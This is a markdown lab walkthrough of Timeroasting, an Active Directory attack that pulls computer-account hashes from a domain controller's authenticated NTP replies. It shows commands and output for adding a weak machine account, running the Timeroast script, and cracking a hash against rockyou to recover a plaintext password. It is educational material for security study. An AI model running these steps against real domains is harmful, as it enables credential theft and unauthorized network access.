# 🔐 Timeroasting

## What is Timeroasting?

**Timeroasting** is a cyber security attack technique that targets **Active Directory (AD) environments**. It allows an attacker to **extract password hashes of computer accounts** from a Domain Controller (DC) using a feature in Microsoft’s custom implementation of the **Network Time Protocol (NTP)**.

## How It Works

In modern AD domains, Microsoft added an **authentication extension to NTP** to prevent time spoofing. When a domain-joined computer requests the current time from a Domain Controller, the DC includes a **Message Authentication Code (MAC)** in the response. This MAC is calculated using the **NTLM hash of the computer account password** as a key.

The important flaw is:

* The client does **not need to be authenticated**.
* Anyone can send a specially crafted NTP request with a **computer account RID (Relative Identifier)**.
* The server will return a valid time response with a MAC that uses the **targeted computer's password hash**.

In effect, this means an attacker can ask the DC to **generate a salted hash of any computer account password** in the domain — without needing any valid credentials.

---

##  When is Timeroasting Successful?

While the concept is clever, Timeroasting is **only effective under certain conditions**:

| Condition                        | Description                                                                                               |
| -------------------------------- | --------------------------------------------------------------------------------------------------------- |
|  **Weak or Static Passwords**  | If computer accounts use weak or manually set passwords (e.g., `Welcome1!`), they can be cracked offline. |
|  **Old or Inactive Accounts** | Machine accounts that are no longer active might have passwords that were never rotated.                  |
|  **Cloned or Imaged Systems**  | If multiple machines are cloned with the same password, cracking one gives access to others.              |
|  **Non-Windows Clients**       | Devices like Linux servers or legacy systems might use fixed or simple passwords.                         |

By default, machine passwords are **long (128 characters)** and **automatically rotated**, making Timeroasting ineffective. But in **misconfigured or poorly managed domains**, it becomes a viable attack.


Got it — here’s a more **to-the-point** version of **Part 2: Setting Up the Lab** for your `.md` file:

---

## Setting Up the Lab

There’s no full lab setup required to perform Timeroasting.

However, to simulate a vulnerable scenario, suppose an admin manually creates a computer account with a weak password:

```bash
impacket-addcomputer -computer-name 'NewComp$' -computer-pass '!)!@carelesswhisper!(&*' -dc-host furious.local 'furious.local/jcharles:complex1@'
```
```
┌──(kali㉿kali)-[~/Home-lab/timeroast/Timeroast]
└─$ impacket-addcomputer -computer-name 'NewComp$' -computer-pass 'Musselburgh21' -dc-host furious.local 'furious.local/Administrator:complexPassword123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account NewComp$ with password Musselburgh21.
                                                                                                                                                 
┌──(kali㉿kali)-[~/Home-lab/timeroast/Timeroast]
```
This adds a machine `NewComp$` with a **static password**. Such accounts are vulnerable to Timeroasting because the password may be crackable once the MAC is obtained via an NTP request.



## Abusing Timoroast

To extract computer account password hashes using Timeroast, we use this Python script from Secura:[Timeroast](https://github.com/SecuraBV/Timeroast)

```
python3 timeroast.py 192.168.129.140 -o hashes.txt 
```
```
┌──(kali㉿kali)-[~/Home-lab/timeroast/Timeroast]
└─$ python3 timeroast.py 192.168.129.140 -o hashes.txt 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Home-lab/timeroast/Timeroast]
└─$ cat hashes.txt 
1000:$sntp-ms$9eb447f975b025ded3de3b9117dd6a17$1c0111e900000000000a00914c4f434cec22449184142c06e1b8428bffbfcd0aec224551780ba047ec224551780c1fc8
1103:$sntp-ms$48aa71e836a25c57ad1bd565893c8210$1c0111e900000000000a00924c4f434cec22449185fdf995e1b8428bffbfcd0aec22455222266772ec22455222271e51
1135:$sntp-ms$5fac50f3376845f4fb87d2ab2a6feaef$1c0111e900000000000a00924c4f434cec22449185d4cac8e1b8428bffbfcd0aec22455255f53825ec22455255f5a533
1144:$sntp-ms$0ca0ab3bd15543dffb04128f1c915a9f$1c0111e900000000000a00924c4f434cec22449186c64c80e1b8428bffbfcd0aec22455262eef00dec22455262ef657e
1150:$sntp-ms$a0af54bbb2371e1fa451f70b24398d3a$1c0111e900000000000a00924c4f434cec22449183889997e1b8428bffbfcd0aec2245526bb95018ec2245526bb9edcc
1151:$sntp-ms$2ec321f9dee078ad74b3b9cbf64c1f6d$1c0111e900000000000a00924c4f434cec224491845cf67be1b8428bffbfcd0aec2245526c8dd89bec2245526c8e368f
1153:$sntp-ms$3fcab8bdfeed02ba37e5a2397623226e$1c0111e900000000000a00924c4f434cec22449186b313bee1b8428bffbfcd0aec2245526ee3d7abec2245526ee4572d
1154:$sntp-ms$0b4e71f42b1cadab0e236520463e1889$1c0111e900000000000a00924c4f434cec22449183c5c571e1b8428bffbfcd0aec2245526fcd8127ec2245526fce1b81
                                            
```

Now use the custom cracking script with a wordlist like rockyou.txt:

```
python3 timeroast_cracker.py -H ../Timeroast/hashes.txt -w /usr/share/wordlists/rockyou.txt 
```
```
┌──(kali㉿kali)-[~/Home-lab/timeroast/timeroast_cracker]
└─$ python3 timeroast_cracker.py -H ../Timeroast/hashes.txt -w /usr/share/wordlists/rockyou.txt 

[*] Cracking RID 1000...
🔍 RID 1000: 100%|████| 14344381/14344381 [01:33<00:00, 152884.14pw/s]
[-] Password for RID 1000 not found in wordlist.

[*] Cracking RID 1103...
🔍 RID 1103: 100%|████| 14344381/14344381 [01:40<00:00, 142777.90pw/s]
[-] Password for RID 1103 not found in wordlist.

[*] Cracking RID 1135...
🔍 RID 1135: 100%|████| 14344381/14344381 [01:52<00:00, 127299.50pw/s]
[-] Password for RID 1135 not found in wordlist.

[*] Cracking RID 1150...
🔍 RID 1150: 100%|████| 14344381/14344381 [01:13<00:00, 194154.42pw/s]
[-] Password for RID 1150 not found in wordlist.

[*] Cracking RID 1151...
🔍 RID 1151: 100%|████| 14344381/14344381 [01:07<00:00, 212365.81pw/s]
[-] Password for RID 1151 not found in wordlist.

[*] Cracking RID 1154...
🔍 RID 1154:   7%|▎    | 1025976/14344381 [00:04<00:56, 234143.70pw/s]
[+] Password for RID 1154: Musselburgh21
🔍 RID 1154:   7%|▎    | 1046126/14344381 [00:04<00:59, 223272.38pw/s]

```


Using Timeroasting, we successfully recovered a plain-text computer password:

```
Musselburgh21
```

This demonstrates how vulnerable weak or static computer account passwords can be exploited to gain unauthorized access.

##  Resources

* Detailed Whitepaper: [Secura Timeroasting Whitepaper (PDF)](https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* Tool Repository: [SecuraBV/Timeroast on GitHub](https://github.com/SecuraBV/Timeroast)
